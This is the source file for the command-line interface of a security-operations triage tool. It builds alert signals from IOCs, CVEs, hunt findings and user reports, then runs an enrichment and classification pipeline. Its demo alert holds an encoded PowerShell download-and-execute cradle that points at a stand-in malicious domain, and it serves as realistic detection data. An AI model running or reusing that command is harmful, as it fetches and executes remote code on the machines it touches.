"""Command-line interface for SOC Triage Bot.

CLI requirements (single-command demo):
  soc-agent triage [--signal-file alert.json | --ioc ... | --cve ... | --hunt-id ... | --user-report ...]
                   [--forecast on|off] [--output report.md] [--demo]
"""

import asyncio
import json
import sys
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Optional

import click

from .adapters import (
    CMDBAdapter,
    EDRAdapter,
    SIEMAdapter,
    ThreatIntelAdapter,
    VulnerabilityAdapter,
)
from .models import Signal, SignalSource, SignalType
from .models.signal import (
    ArtifactContext,
    DetectionContext,
    EntityBehaviorContext,
    VulnerabilityContext,
)
from .services import EnrichmentService, TriageService
from .services.forecasting import MultiTrackHistoricalData, TrackTimeSeries

# =============================================================================
# BANNER & UI/UX UTILITIES
# =============================================================================

# ANSI color codes
class Colors:
    """ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

    # Gradient-like colors
    PURPLE = '\033[38;5;135m'
    MAGENTA = '\033[38;5;199m'
    ORANGE = '\033[38;5;208m'
    TEAL = '\033[38;5;43m'
    WHITE = '\033[97m'


def supports_color() -> bool:
    """Check if terminal supports color output."""
    if not hasattr(sys.stdout, 'isatty'):
        return False
    if not sys.stdout.isatty():
        return False
    return True


def c(text: str, color: str) -> str:
    """Colorize text if terminal supports it."""
    if supports_color():
        return f"{color}{text}{Colors.RESET}"
    return text


def show_banner(subtitle: str = "", show_version: bool = True):
    """Display the SOC Agent banner with optional subtitle.

    Args:
        subtitle: Optional subtitle to display below the banner
        show_version: Whether to show version info
    """
    version = "v1.0.0"

    # Clean, compact ASCII art banner
    click.echo("")
    click.echo(f"  {c('╭─────────────────────────────────────────────╮', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}                                             {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}   {c('███████╗ ██████╗  ██████╗', Colors.PURPLE)}               {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}   {c('██╔════╝██╔═══██╗██╔════╝', Colors.PURPLE)}               {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}   {c('███████╗██║   ██║██║', Colors.PURPLE)}                    {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}   {c('╚════██║██║   ██║██║', Colors.PURPLE)}                    {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}   {c('███████║╚██████╔╝╚██████╗', Colors.PURPLE)}               {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}   {c('╚══════╝ ╚═════╝  ╚═════╝', Colors.PURPLE)}               {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}                                             {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}     {c('A G E N T', Colors.MAGENTA + Colors.BOLD)}                           {c('│', Colors.CYAN)}")
    click.echo(f"  {c('│', Colors.CYAN)}                                             {c('│', Colors.CYAN)}")
    click.echo(f"  {c('╰─────────────────────────────────────────────╯', Colors.CYAN)}")

    # Tagline
    tagline = "🛡️  Autonomous Security Operations Center"
    click.echo(f"\n    {c(tagline, Colors.WHITE + Colors.BOLD)}")

    if show_version:
        click.echo(f"    {c(f'Version {version}', Colors.DIM)} | {c('SIEM-Agnostic • Async • AI-Ready', Colors.DIM)}")

    if subtitle:
        click.echo(f"\n    {c('▸', Colors.TEAL)} {c(subtitle, Colors.WHITE)}")

    click.echo("")  # Empty line after banner


def show_section(title: str, icon: str = "▸"):
    """Display a section header."""
    click.echo(f"\n{c(icon, Colors.TEAL)} {c(title, Colors.BOLD + Colors.WHITE)}")
    click.echo(c("─" * 60, Colors.DIM))


def show_step(step_num: int, description: str, status: str = "running"):
    """Display a step indicator."""
    icons = {
        "running": c("◐", Colors.YELLOW),
        "done": c("✓", Colors.GREEN),
        "error": c("✗", Colors.RED),
        "skip": c("○", Colors.DIM),
    }
    icon = icons.get(status, icons["running"])
    click.echo(f"  {icon} {c(f'Step {step_num}:', Colors.BOLD)} {description}")


def show_success(message: str):
    """Display a success message."""
    click.echo(f"\n  {c('✓', Colors.GREEN)} {c(message, Colors.GREEN)}")


def show_error(message: str):
    """Display an error message."""
    click.echo(f"\n  {c('✗', Colors.RED)} {c(message, Colors.RED)}")


def show_info(message: str):
    """Display an info message."""
    click.echo(f"  {c('ℹ', Colors.BLUE)} {message}")


def show_warning(message: str):
    """Display a warning message."""
    click.echo(f"  {c('⚠', Colors.YELLOW)} {c(message, Colors.YELLOW)}")


def show_divider():
    """Display a subtle divider."""
    click.echo(c("  " + "─" * 56, Colors.DIM))


# =============================================================================
# SERVICE SETUP
# =============================================================================

def setup_triage_service():
    """Initialize the triage service."""
    adapters = [
        SIEMAdapter(),
        EDRAdapter(),
        ThreatIntelAdapter(),
        VulnerabilityAdapter(),
        CMDBAdapter()
    ]

    enrichment_service = EnrichmentService(adapters)
    return TriageService(enrichment_service=enrichment_service)


@click.group(invoke_without_command=True)
@click.version_option(version="1.0.0", prog_name="SOC Agent")
@click.pass_context
def main(ctx):
    """SOC Agent - Autonomous Security Operations Center Agent.

    An async, SIEM-agnostic triage agent for security signal analysis,
    enrichment, classification, and response recommendations.
    """
    # Show banner when no command is specified
    if ctx.invoked_subcommand is None:
        show_banner()
        click.echo(c("  Available Commands:", Colors.BOLD))
        click.echo(f"    {c('triage', Colors.CYAN)}    - Triage a security signal")
        click.echo(f"    {c('serve', Colors.CYAN)}     - Start the REST API server")
        click.echo(f"    {c('create', Colors.CYAN)}    - Create a new signal interactively")
        click.echo(f"    {c('validate', Colors.CYAN)}  - Validate a signal JSON file")
        click.echo(f"    {c('health', Colors.CYAN)}    - Check adapter health status")
        click.echo(f"\n  {c('Run', Colors.DIM)} {c('soc-agent <command> --help', Colors.WHITE)} {c('for more info', Colors.DIM)}\n")


@main.command()
@click.option("--host", default="0.0.0.0", help="Host to bind to")
@click.option("--port", default=8000, type=int, help="Port to bind to")
@click.option("--reload", is_flag=True, help="Enable auto-reload for development")
def serve(host: str, port: int, reload: bool):
    """Start the REST API server."""
    import uvicorn

    show_banner(subtitle="REST API Server")

    show_section("Server Configuration")
    show_info(f"Host: {c(host, Colors.CYAN)}")
    show_info(f"Port: {c(str(port), Colors.CYAN)}")
    show_info(f"Auto-reload: {c('enabled', Colors.GREEN) if reload else c('disabled', Colors.DIM)}")

    show_divider()
    show_step(1, f"Starting Uvicorn server on {c(f'http://{host}:{port}', Colors.UNDERLINE)}", "running")

    uvicorn.run(
        "soc_triage_bot.api:app",
        host=host,
        port=port,
        reload=reload
    )


@main.command()
@click.option("--signal-file", type=click.Path(exists=True), help="Signal JSON file")
@click.option("--ioc", type=str, help="IOC string (format: type=value, e.g., domain=evil.com)")
@click.option("--cve", type=str, help="CVE identifier (e.g., CVE-2024-12345)")
@click.option("--hunt-id", type=str, help="Hunt finding ID (e.g., HUNT-007)")
@click.option("--user-report", type=click.Path(exists=True), help="User report text file")
@click.option("--historical-data", type=click.Path(exists=True), help="Historical data JSON file")
@click.option("--forecast", type=click.Choice(["on", "off"]), default="on", help="Enable/disable ETS forecasting")
@click.option("--output", "-o", type=click.Path(), help="Output file for report")
@click.option("--format", "-f", type=click.Choice(["markdown", "json"]), default="markdown", help="Output format")
@click.option("--demo", is_flag=True, help="Run in demo mode with sample data")
def triage(
    signal_file: Optional[str],
    ioc: Optional[str],
    cve: Optional[str],
    hunt_id: Optional[str],
    user_report: Optional[str],
    historical_data: Optional[str],
    forecast: str,
    output: Optional[str],
    format: str,
    demo: bool,
):
    """Triage a security signal from various input sources.

    Input can be one of:
    - --signal-file: Full signal JSON file
    - --ioc: IOC string (type=value format)
    - --cve: CVE identifier
    - --hunt-id: Hunt finding ID
    - --user-report: User report text file
    - --demo: Generate sample SIEM alert for demonstration

    Examples:
        soc-agent triage --signal-file alert.json
        soc-agent triage --ioc "domain=evil.com"
        soc-agent triage --cve CVE-2024-12345
        soc-agent triage --hunt-id HUNT-007
        soc-agent triage --user-report report.txt
        soc-agent triage --demo --output report.md
    """
    # Show banner
    show_banner(subtitle="Signal Triage & Analysis")

    # Step 0: Determine input source and build signal
    signal = None
    hist_data = None
    input_source = ""

    show_section("Input Processing")

    if demo:
        # Demo mode: generate sample SIEM alert
        signal = create_demo_signal()
        input_source = "demo"
        show_info(f"Demo mode: Generated sample {c('SIEM_ALERT', Colors.CYAN)}")
    elif signal_file:
        # Load from JSON file
        with open(signal_file) as f:
            signal_data = json.load(f)
        signal = parse_signal_from_json(signal_data)
        input_source = f"file: {Path(signal_file).name}"
        show_info(f"Loaded signal from {c(Path(signal_file).name, Colors.CYAN)}")
    elif ioc:
        # Create IOC signal from string
        signal = create_signal_from_ioc(ioc)
        input_source = f"IOC: {ioc}"
        show_info(f"Created IOC signal: {c(ioc, Colors.CYAN)}")
    elif cve:
        # Create CVE signal
        signal = create_signal_from_cve(cve)
        input_source = f"CVE: {cve}"
        show_info(f"Created CVE signal: {c(cve, Colors.CYAN)}")
    elif hunt_id:
        # Create hunt finding signal
        signal = create_signal_from_hunt(hunt_id)
        input_source = f"Hunt: {hunt_id}"
        show_info(f"Created Hunt signal: {c(hunt_id, Colors.CYAN)}")
    elif user_report:
        # Create user report signal from file
        signal = create_signal_from_user_report(user_report)
        input_source = f"report: {Path(user_report).name}"
        show_info(f"Created signal from user report: {c(Path(user_report).name, Colors.CYAN)}")
    else:
        show_error("No input specified!")
        raise click.UsageError(
            "Must specify one of: --signal-file, --ioc, --cve, --hunt-id, --user-report, or --demo"
        )

    # Load historical data if provided
    if historical_data:
        with open(historical_data) as f:
            hist_data = json.load(f)
        show_info(f"Loaded historical data from {c(Path(historical_data).name, Colors.CYAN)}")

    # Step 1: Normalize signal
    signal = normalize_signal_cli(signal)

    # Configure forecast option
    forecast_enabled = forecast == "on"

    # Show triage details
    show_section("Triage Execution")
    show_info(f"Signal ID: {c(signal.signal_id, Colors.WHITE + Colors.BOLD)}")
    show_info(f"Type: {c(signal.signal_type.value.upper(), Colors.CYAN)}")
    show_info(f"Severity: {c(signal.severity.upper(), Colors.YELLOW if signal.severity in ['high', 'critical'] else Colors.WHITE)}")
    show_info(f"Forecast: {c('enabled', Colors.GREEN) if forecast_enabled else c('disabled', Colors.DIM)}")

    show_divider()

    # Execute triage with step indicators
    show_step(1, "Running concurrent enrichments...", "running")
    show_step(2, "Analyzing historical patterns...", "running" if forecast_enabled else "skip")
    show_step(3, "Finding similar cases...", "running")
    show_step(4, "Classifying signal...", "running")
    show_step(5, "Generating recommendations...", "running")

    result = asyncio.run(execute_triage(signal, hist_data, forecast_enabled))

    # Show completion
    duration_sec = result.duration_ms / 1000 if result.duration_ms else 0
    show_success(f"Triage completed in {c(f'{duration_sec:.2f}s', Colors.WHITE)}")

    # Output results
    if format == "json":
        output_data = format_result_as_json(result)
        output_text = json.dumps(output_data, indent=2, default=str)
    else:
        output_text = result.report

    if output:
        with open(output, "w") as f:
            f.write(output_text)
        show_section("Output")
        show_success(f"Report written to: {c(output, Colors.CYAN + Colors.UNDERLINE)}")
    else:
        show_section("Report Output")
        click.echo("")
        click.echo(output_text)


@main.command()
@click.option("--type", "signal_type", type=click.Choice(["siem_alert", "ioc", "cve", "hunt", "user_report"]),
              default="siem_alert", help="Signal type")
@click.option("--title", prompt=True, help="Signal title")
@click.option("--description", prompt=True, help="Signal description")
@click.option("--severity", type=click.Choice(["low", "medium", "high", "critical"]),
              default="medium", help="Severity level")
@click.option("--output", "-o", type=click.Path(), help="Output file for report")
def create(signal_type: str, title: str, description: str, severity: str, output: Optional[str]):
    """Create and triage a new signal interactively."""
    show_banner(subtitle="Interactive Signal Creation")

    show_section("Signal Details")
    # Create signal
    signal = Signal(
        signal_id=f"sig-{datetime.utcnow().strftime('%Y%m%d%H%M%S')}",
        signal_type=SignalType(signal_type),
        timestamp=datetime.utcnow(),
        source=SignalSource(system="cli", rule_name="manual"),
        title=title,
        description=description,
        severity=severity,
        entities={},
        tags=[],
        raw_data={}
    )

    show_success(f"Created signal: {c(signal.signal_id, Colors.CYAN)}")
    show_info(f"Type: {c(signal_type.upper(), Colors.WHITE)}")
    show_info(f"Severity: {c(severity.upper(), Colors.YELLOW if severity in ['high', 'critical'] else Colors.WHITE)}")

    show_divider()
    show_section("Running Triage")

    # Execute triage (with forecast enabled by default)
    result = asyncio.run(execute_triage(signal, None, forecast_enabled=True))

    # Output report
    show_section("Output")
    if output:
        with open(output, "w") as f:
            f.write(result.report)
        show_success(f"Report written to: {c(output, Colors.CYAN + Colors.UNDERLINE)}")
    else:
        click.echo("")
        click.echo(result.report)


@main.command()
def health():
    """Check health of all adapters."""
    show_banner(subtitle="System Health Check")

    adapters = [
        SIEMAdapter(),
        EDRAdapter(),
        ThreatIntelAdapter(),
        VulnerabilityAdapter(),
        CMDBAdapter()
    ]

    enrichment_service = EnrichmentService(adapters)

    show_section("Adapter Status")
    show_step(1, "Checking adapter connectivity...", "running")

    health_status = asyncio.run(enrichment_service.health_check())

    click.echo("")
    for adapter_name, is_healthy in health_status.items():
        if is_healthy:
            click.echo(f"  {c('●', Colors.GREEN)} {adapter_name}: {c('healthy', Colors.GREEN)}")
        else:
            click.echo(f"  {c('●', Colors.RED)} {adapter_name}: {c('unhealthy', Colors.RED)}")

    healthy_count = sum(1 for h in health_status.values() if h)
    total_count = len(health_status)

    show_divider()
    if healthy_count == total_count:
        show_success(f"All {total_count} adapters are healthy")
    else:
        show_warning(f"{healthy_count}/{total_count} adapters healthy")


@main.command()
@click.argument("signal_file", type=click.Path(exists=True))
def validate(signal_file: str):
    """Validate a signal JSON file."""
    show_banner(subtitle="Signal Validation")

    show_section("Validating Signal")
    show_info(f"File: {c(signal_file, Colors.CYAN)}")

    try:
        with open(signal_file) as f:
            signal_data = json.load(f)

        signal = parse_signal_from_json(signal_data)

        show_divider()
        show_success(f"Signal is valid!")
        click.echo("")
        click.echo(f"  {c('Signal ID:', Colors.DIM)} {c(signal.signal_id, Colors.WHITE)}")
        click.echo(f"  {c('Type:', Colors.DIM)} {c(signal.signal_type.value.upper(), Colors.CYAN)}")
        click.echo(f"  {c('Severity:', Colors.DIM)} {c(signal.severity.upper(), Colors.YELLOW if signal.severity in ['high', 'critical'] else Colors.WHITE)}")
        click.echo(f"  {c('Entities:', Colors.DIM)} {c(str(len(signal.entities)), Colors.WHITE)} types")
        click.echo("")
    except json.JSONDecodeError as e:
        show_divider()
        show_error(f"Invalid JSON: {e}")
        raise click.Abort()
    except Exception as e:
        show_divider()
        show_error(f"Validation failed: {e}")
        raise click.Abort()


async def execute_triage(signal: Signal, historical_data, forecast_enabled: bool = True):
    """Execute triage asynchronously using the extended multi-track triage.

    Args:
        signal: Normalized signal to triage
        historical_data: Optional multi-track historical data for forecasting
        forecast_enabled: Whether to run ETS forecasting
    """
    triage_service = setup_triage_service()
    
    # Convert legacy historical_data to MultiTrackHistoricalData if needed
    multi_track_data = None
    if historical_data is not None:
        if isinstance(historical_data, MultiTrackHistoricalData):
            multi_track_data = historical_data
        elif isinstance(historical_data, list) and historical_data:
            # Convert legacy list format to MultiTrackHistoricalData
            # Create a basic Track A series from the list
            values = [d.get("count", 0) for d in historical_data]
            timestamps_raw = [d.get("timestamp") for d in historical_data]
            from datetime import datetime
            timestamps = []
            for ts in timestamps_raw:
                if isinstance(ts, datetime):
                    timestamps.append(ts)
                elif isinstance(ts, str):
                    try:
                        timestamps.append(datetime.fromisoformat(ts.replace("Z", "+00:00")))
                    except ValueError:
                        timestamps.append(datetime.utcnow())
                else:
                    timestamps.append(datetime.utcnow())
            
            track_a = TrackTimeSeries(
                track_name="rule",
                entity_key="rule_id",
                entity_value=signal.source.rule_id or "unknown",
                metric_name="alert_count",
                timestamps=timestamps,
                values=values,
                bucket_minutes=15,
            )
            multi_track_data = MultiTrackHistoricalData(track_a=track_a)
    
    result = await triage_service.triage_extended(
        signal, multi_track_data, forecast_enabled=forecast_enabled
    )
    return result


# =============================================================================
# SIGNAL FACTORY FUNCTIONS
# =============================================================================

def create_demo_signal() -> Signal:
    """Create a sample SIEM alert for demonstration."""
    return Signal(
        signal_id=f"demo-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.SIEM_ALERT,
        timestamp=datetime.utcnow(),
        source=SignalSource(
            system="splunk",
            rule_id="rule-demo-001",
            rule_name="Suspicious PowerShell Execution",
        ),
        title="Suspicious PowerShell Execution Detected",
        description="PowerShell process launched with encoded command and network activity to known malicious domain.",
        severity="high",
        entities={
            "hostname": ["workstation-demo-01"],
            "username": ["demo-admin"],
            "ip": ["192.0.2.100", "198.51.100.50"],
        },
        indicators={"domain": "evil-demo.com", "ip": "198.51.100.50"},
        tags=["malware", "powershell", "c2"],
        raw_data={
            "process_name": "powershell.exe",
            "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGQAZQBtAG8ALgBjAG8AbQAnACkA",
            "parent_process": "explorer.exe",
        },
        detection_context=DetectionContext(
            rule_id="rule-demo-001",
            detection_name="Suspicious PowerShell Execution",
            mitre_tactics=["execution", "command_and_control"],
            mitre_techniques=["T1059.001", "T1071.001"],
        ),
        entity_context=EntityBehaviorContext(
            hostname="workstation-demo-01",
            username="demo-admin",
            src_ip="192.0.2.100",
        ),
        artifact_context=ArtifactContext(
            domain="evil-demo.com",
            ip="198.51.100.50",
            process_name="powershell.exe",
        ),
    )


def create_signal_from_ioc(ioc_string: str) -> Signal:
    """Create an IOC signal from a type=value string.

    Args:
        ioc_string: IOC in format "type=value" (e.g., "domain=evil.com")

    Returns:
        Signal with IOC type and populated artifact context
    """
    # Parse IOC string
    if "=" not in ioc_string:
        raise click.UsageError(f"Invalid IOC format: '{ioc_string}'. Expected type=value (e.g., domain=evil.com)")

    ioc_type, ioc_value = ioc_string.split("=", 1)
    ioc_type = ioc_type.strip().lower()
    ioc_value = ioc_value.strip()

    # Build artifact context based on IOC type
    artifact_context = ArtifactContext()
    if ioc_type == "domain":
        artifact_context.domain = ioc_value
    elif ioc_type == "ip":
        artifact_context.ip = ioc_value
    elif ioc_type in ("sha256", "hash"):
        artifact_context.sha256 = ioc_value
    elif ioc_type == "md5":
        artifact_context.md5 = ioc_value
    elif ioc_type == "url":
        artifact_context.url = ioc_value
    else:
        # Generic indicator
        pass

    return Signal(
        signal_id=f"ioc-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.IOC,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="cli", rule_name="ioc-lookup"),
        title=f"IOC Lookup: {ioc_type}={ioc_value}",
        description=f"Manual IOC lookup for {ioc_type}: {ioc_value}",
        severity="medium",
        indicators={ioc_type: ioc_value},
        artifact_context=artifact_context,
        tags=["ioc", ioc_type],
        raw_data={"ioc_type": ioc_type, "ioc_value": ioc_value},
    )


def create_signal_from_cve(cve_id: str) -> Signal:
    """Create a CVE/vulnerability signal.

    Args:
        cve_id: CVE identifier (e.g., CVE-2024-12345)

    Returns:
        Signal with CVE type and populated vulnerability context
    """
    # Normalize CVE ID
    cve_id = cve_id.upper()
    if not cve_id.startswith("CVE-"):
        cve_id = f"CVE-{cve_id}"

    return Signal(
        signal_id=f"vuln-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.CVE,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="cli", rule_name="cve-lookup"),
        title=f"Vulnerability Report: {cve_id}",
        description=f"Vulnerability lookup for {cve_id}",
        severity="high",  # Default high for vulnerabilities
        vuln_context=VulnerabilityContext(cve_id=cve_id),
        tags=["vulnerability", "cve"],
        raw_data={"cve_id": cve_id},
    )


def create_signal_from_hunt(hunt_id: str) -> Signal:
    """Create a hunt finding signal.

    Args:
        hunt_id: Hunt finding identifier (e.g., HUNT-007)

    Returns:
        Signal with HUNT type
    """
    return Signal(
        signal_id=f"hunt-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.HUNT,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="threat-hunting", rule_id=hunt_id),
        title=f"Hunt Finding: {hunt_id}",
        description=f"Threat hunting finding {hunt_id}",
        severity="medium",
        tags=["hunt", "proactive"],
        raw_data={"hunt_id": hunt_id},
        metadata={"hunt_id": hunt_id},
    )


def create_signal_from_user_report(report_file: str) -> Signal:
    """Create a user report signal from a text file.

    Args:
        report_file: Path to user report text file

    Returns:
        Signal with USER_REPORT type
    """
    with open(report_file) as f:
        report_content = f.read()

    # Extract first line as title, rest as description
    lines = report_content.strip().split("\n")
    title = lines[0] if lines else "User Report"
    description = "\n".join(lines[1:]) if len(lines) > 1 else report_content

    return Signal(
        signal_id=f"user-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.USER_REPORT,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="user-report", rule_name="user-submitted"),
        title=title[:100],  # Truncate long titles
        description=description,
        severity="medium",  # Default medium for user reports
        tags=["user-report"],
        raw_data={"report_content": report_content, "source_file": report_file},
    )


# =============================================================================
# NORMALIZATION
# =============================================================================

def normalize_signal_cli(signal: Signal) -> Signal:
    """Normalize a signal for CLI processing.

    This function:
    1. Extracts entities from various signal fields
    2. Determines signal_subtype (auth/endpoint/network/email/vuln/etc.)
    3. Selects entity_focus.primary using mapping rules

    Args:
        signal: Raw signal to normalize

    Returns:
        Normalized signal with extracted context
    """
    # Extract entities from all sources and merge into entities dict
    entities = dict(signal.entities)  # Copy existing

    # Extract from entity_context
    if signal.entity_context:
        if signal.entity_context.hostname and "hostname" not in entities:
            entities["hostname"] = [signal.entity_context.hostname]
        if signal.entity_context.username and "username" not in entities:
            entities["username"] = [signal.entity_context.username]
        if signal.entity_context.src_ip and "ip" not in entities:
            entities["ip"] = [signal.entity_context.src_ip]

    # Extract from artifact_context (IOCs)
    indicators = dict(signal.indicators)
    if signal.artifact_context:
        for attr in ["domain", "ip", "sha256", "md5", "url"]:
            val = getattr(signal.artifact_context, attr, None)
            if val and attr not in indicators:
                indicators[attr] = val

    # Determine signal subtype based on content
    signal_subtype = _determine_signal_subtype(signal)

    # Select entity focus based on signal type and available entities
    entity_focus = _select_entity_focus(signal, entities)

    # Update signal with normalized data (create new signal with updates)
    # Note: We store subtype and focus in metadata since Signal model may not have these fields directly
    updated_metadata = dict(signal.metadata)
    updated_metadata["signal_subtype"] = signal_subtype
    updated_metadata["entity_focus_primary"] = entity_focus

    return Signal(
        signal_id=signal.signal_id,
        signal_type=signal.signal_type,
        timestamp=signal.timestamp,
        source=signal.source,
        title=signal.title,
        description=signal.description,
        severity=signal.severity,
        entities=entities,
        indicators=indicators,
        tags=signal.tags,
        raw_data=signal.raw_data,
        metadata=updated_metadata,
        detection_context=signal.detection_context,
        entity_context=signal.entity_context,
        artifact_context=signal.artifact_context,
        vuln_context=signal.vuln_context,
    )


def _determine_signal_subtype(signal: Signal) -> str:
    """Determine signal subtype based on content analysis.

    Returns one of: auth, endpoint, network, email, vuln, ioc, hunt, other
    """
    signal_type = signal.signal_type.value.lower()

    # Direct mapping for some signal types
    if signal_type == "cve":
        return "vuln"
    if signal_type == "ioc":
        return "ioc"
    if signal_type == "hunt":
        return "hunt"
    if signal_type == "user_report":
        return "user"

    # Content-based detection for SIEM alerts
    description_lower = signal.description.lower()
    title_lower = signal.title.lower()
    tags = [t.lower() for t in signal.tags]

    # Check for authentication-related
    if any(kw in description_lower or kw in title_lower for kw in ["login", "auth", "password", "credential", "brute"]):
        return "auth"

    # Check for email-related
    if any(kw in description_lower or kw in title_lower for kw in ["email", "phishing", "spam", "attachment"]):
        return "email"

    # Check for network-related
    if any(kw in description_lower or kw in title_lower for kw in ["network", "firewall", "dns", "c2", "beacon"]):
        return "network"

    # Check for endpoint-related (default for many detections)
    if any(kw in description_lower or kw in title_lower for kw in ["process", "powershell", "script", "malware", "execution"]):
        return "endpoint"

    return "other"


def _select_entity_focus(signal: Signal, entities: Dict[str, Any]) -> str:
    """Select primary entity focus based on signal type and available entities.

    Returns the primary entity type to focus on for Track C (entity behavior).
    """
    signal_type = signal.signal_type.value.lower()

    # Signal type specific preferences
    focus_preferences = {
        "siem_alert": ["hostname", "username", "ip"],
        "ioc": ["hostname", "ip", "domain"],
        "cve": ["hostname", "asset_group"],
        "hunt": ["hostname", "username"],
        "user_report": ["username", "hostname"],
    }

    preferences = focus_preferences.get(signal_type, ["hostname", "username", "ip"])

    # Return first available entity type
    for entity_type in preferences:
        if entity_type in entities and entities[entity_type]:
            return entity_type

    return "hostname"  # Default fallback


def parse_signal_from_json(data: dict) -> Signal:
    """Parse a signal from JSON data."""
    signal_type = SignalType(data.get("signal_type", "siem_alert"))

    # Parse timestamp
    timestamp_str = data.get("timestamp")
    if timestamp_str:
        timestamp = datetime.fromisoformat(timestamp_str.replace("Z", "+00:00"))
    else:
        timestamp = datetime.utcnow()

    # Parse source
    source_data = data.get("source", {})
    source = SignalSource(
        system=source_data.get("system", "unknown"),
        instance=source_data.get("instance"),
        rule_id=source_data.get("rule_id"),
        rule_name=source_data.get("rule_name")
    )

    return Signal(
        signal_id=data.get("signal_id", f"sig-{int(datetime.utcnow().timestamp())}"),
        signal_type=signal_type,
        timestamp=timestamp,
        source=source,
        title=data.get("title", "Untitled"),
        description=data.get("description", ""),
        severity=data.get("severity", "medium"),
        entities=data.get("entities", {}),
        raw_data=data.get("raw_data", {}),
        tags=data.get("tags", []),
        metadata=data.get("metadata", {})
    )


def format_result_as_json(result):
    """Format triage result as JSON."""
    return {
        "signal_id": result.signal.signal_id,
        "classification": {
            "label": result.classification.label.value,
            "confidence": result.classification.confidence,
            "reasoning": result.classification.reasoning,
            "factors": result.classification.factors
        },
        "actions": [
            {
                "action_id": action.action_id,
                "type": action.action_type.value,
                "priority": action.priority,
                "title": action.title,
                "description": action.description,
                "source": action.source,
                "confidence": action.confidence
            }
            for action in result.actions
        ],
        "enrichments": {
            name: {
                "status": enrich.status.value,
                "duration_ms": enrich.duration_ms
            }
            for name, enrich in result.enrichments.items()
        },
        "duration_ms": result.duration_ms,
        "timestamp": result.timestamp.isoformat()
    }


if __name__ == "__main__":
    main()

